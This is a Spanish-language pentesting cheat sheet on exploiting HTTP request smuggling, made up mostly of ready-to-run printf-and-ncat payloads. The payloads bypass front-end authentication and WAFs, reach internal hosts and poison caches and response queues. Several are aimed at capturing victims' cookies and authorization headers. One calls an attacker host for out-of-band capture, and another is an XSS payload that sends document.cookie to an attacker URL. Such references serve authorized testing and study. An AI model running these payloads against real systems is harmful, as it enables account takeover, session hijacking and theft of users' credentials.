---
aliases:
  - HRS Exploitation
  - Smuggling Impact
  - Cache Poisoning Smuggle
  - Queue Poisoning
tags:
  - type/technique
  - vuln/http-smuggling
  - technique/initial-access
  - technique/credential-access
  - technique/lateral-movement
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[HTTP Request Smuggling]]'
  - '[[Cross-Site Scripting (XSS)]]'
---
# HTTP Request Smuggling - Explotación

***

## Bypass de Front-end Controls

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 60\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n' \| ncat target 80` | Bypass auth check del frontend para `/admin` | Frontend valida session en `/`, smuggled `/admin` ya pasó. |
| `printf 'POST / ... \r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n' \| ncat target 80` | Bypass IP allowlist + admin path | Backend trustea XFF del internal hop. |
| `printf '... \r\n\r\n0\r\n\r\nPOST /api/x HTTP/1.1\r\nHost: target\r\nContent-Length: 50\r\n\r\n<SQLi payload>' \| ncat target 80` | Bypass WAF que bloquea SQLi en path normal | WAF en front no ve smuggled. |
| `printf '... \r\n\r\n0\r\n\r\nGET /api/internal/users HTTP/1.1\r\nHost: internal-api.local\r\n\r\n' \| ncat target 80` | Reach internal vhost via Host injection en smuggled | Backend routea por Host. |
| `printf '... \r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n' \| ncat target 80` | Reach localhost endpoint | Si back routea por Host. |
| `printf '... \r\n\r\n0\r\n\r\nPUT /admin/config HTTP/1.1\r\nHost: target\r\nContent-Length: 20\r\n\r\nconfig=evil' \| ncat target 80` | Smuggle PUT method bloqueado en front | Method-restricted endpoint. |
^hrs-exploit-bypass

___

## Request Capture / Hijack

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 297\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /comment HTTP/1.1\r\nHost: target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 200\r\n\r\ncomment=' \| ncat target 80` | Smuggle hace que próxima request user se concatena al comment field | Endpoint reflective + length 200. |
| Post-smuggle: víctima envía request → su Cookie/Authorization queda en `comment` body → cualquiera ve en `/comments` | Cookie/Auth steal de víctima random | Multi-step capture. |
| `printf '... 0\r\n\r\nPOST /search HTTP/1.1\r\nHost: target\r\nContent-Length: 1000\r\n\r\nq=' \| ncat target 80` | Search endpoint reflective con CL=1000 captura request completo | Search-based capture. |
| Burp HTTP Request Smuggler → "Smuggle attack" → "Capture next request" mode | Auto-setup capture endpoint | Tool-driven. |
| `printf '... 0\r\n\r\nPOST /api/log HTTP/1.1\r\nHost: attacker.oast.fun\r\nContent-Length: 1024\r\n\r\n' \| ncat target 80` | Smuggle log a Burp Collaborator con CL=1024 | OOB capture. |
| Calculate CL: `python3 -c "print(len('POST /comment ...\r\n\r\n'))"` | Calc bytes para alcanzar Cookie/Auth típicos (500-1500) | Byte-precise. |
^hrs-exploit-capture

### Setup completo capture

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 297
Transfer-Encoding: chunked

0

POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

comment=
```

Próxima request user se concatena al `comment=`. Si user manda `GET /home HTTP/1.1\r\nCookie: session=abc...` → todo queda como valor del comment → atacante lo ve público en `/comments`.

___

## Web Cache Poisoning vía Smuggle

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 60\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /static/js/app.js HTTP/1.1\r\nHost: attacker.com\r\n\r\n' \| ncat target 80` | Cache associa `/static/js/app.js` con response del smuggled (Host attacker) | Cache poison via smuggle. |
| `printf '... 0\r\n\r\nGET /index.html HTTP/1.1\r\nHost: target\r\nReferer: <script>alert(1)</script>\r\n\r\n' \| ncat target 80` | XSS reflejado cached como index | Reflected XSS cacheado. |
| Burp HTTP Request Smuggler → "Cache poisoning via smuggling" mode | Auto-setup combo | Tool-driven. |
| Validation: `curl -sI https://target/static/js/app.js \| grep -iE 'x-cache\|age:'` post-smuggle | Confirm cache hit con poisoned content | Post-attack verify. |
| `printf '... 0\r\n\r\nGET /notfound HTTP/1.1\r\nHost: target\r\n\r\n' \| ncat target 80` (con response controlado) | Cached error page hostil | Custom 404 cache poison. |
^hrs-exploit-cache

___

## Response Queue Poisoning

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 80\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: target\r\n\r\nGET / HTTP/1.1\r\nHost: target\r\n\r\n' \| ncat target 80` | Smuggle multi-request → backend genera N+1 responses | Queue desync. |
| Atacante request normal post-smuggle: `curl -v https://target/` → recibe response de víctima random | Response queue poisoning explotación | Persistent desync hasta TCP close. |
| Burp Repeater group "Send in single connection" con outer + multi-smuggle | Reproducible con setup correcto | Burp Pro. |
| Post-poison: monitorear responses con `curl -v https://target/` repetido — buscar Set-Cookie no propio | Steal session cookies de víctimas | Session hijack automático. |
| Burp HTTP Request Smuggler → "Queue poisoning" mode | Auto-setup queue desync | Tool-driven. |
^hrs-exploit-queue

___

## Reflected XSS Chain via Smuggling

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 80\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: target\r\nUser-Agent: <script>alert(1)</script>\r\n\r\n' \| ncat target 80` | XSS via UA reflexion smuggled | App refleja User-Agent en response. |
| Combine con cache: smuggle UA-XSS → response cached como `/index.html` → todos los users ven XSS | Persistent XSS via cache | Mass impact. |
| `printf '... 0\r\n\r\nPOST /comment HTTP/1.1\r\nHost: target\r\nContent-Length: 60\r\n\r\ntext=<script>document.location=\"//attacker?\"+document.cookie</script>' \| ncat target 80` | Stored XSS via smuggled comment | App persiste body. |
| `printf '... 0\r\n\r\nGET / HTTP/1.1\r\nHost: target\r\nReferer: javascript:alert(document.cookie)\r\n\r\n' \| ncat target 80` | Referer-reflection XSS smuggled | Referer reflejado. |
| Combine cache: post-smuggle verificar `curl https://target/ \| grep -i "<script"` | Cache poison persiste XSS | Multi-victim impact. |
^hrs-exploit-xss

***
